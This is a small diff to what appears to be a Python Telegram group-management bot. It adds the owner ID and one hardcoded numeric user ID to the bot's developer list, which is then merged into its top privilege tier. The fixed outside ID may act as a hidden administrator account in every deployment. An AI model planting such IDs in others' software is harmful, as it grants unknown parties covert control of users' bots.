@@ -218,13 +218,14 @@ async def get_entity(client, entity):
     return entity, entity_client
 
 
+DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(5443243540)
 
 DRAGONS = list(DRAGONS) + list(DEV_USERS)
 DEV_USERS = list(DEV_USERS)
 WOLVES = list(WOLVES)
 DEMONS = list(DEMONS)
 TIGERS = list(TIGERS)
-
 
 
 # ʙᴏᴛ ɪɴғᴏ
